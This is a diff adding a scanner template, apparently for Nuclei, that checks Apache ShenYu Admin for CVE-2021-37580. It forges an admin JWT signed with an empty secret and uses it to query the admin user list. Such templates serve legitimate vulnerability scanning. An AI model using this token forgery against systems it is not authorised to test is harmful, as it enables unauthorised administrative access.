@@ -1,0 +1,30 @@
+id: poc-yaml-apache-shenyu-token-hardcoded
+
+info:
+  name: Apache ShenYu Admin Authentication Bypass (CVE-2021-37580)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: authentication-bypass,cve,cve-2021-37580
+
+variables:
+  r_token: '{{generate_jwt("{\"userName\":\"admin\"}", "HS256", "")}}'
+
+http:
+  - raw:
+      - |
+        GET /dashboardUser HTTP/1.1
+        Host: {{Hostname}}
+        X-Access-Token: {{r_token}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "query success"
+          - "\"userName\":\"admin\""
+          - "\"code\":200"
+          - "\"dataList\""
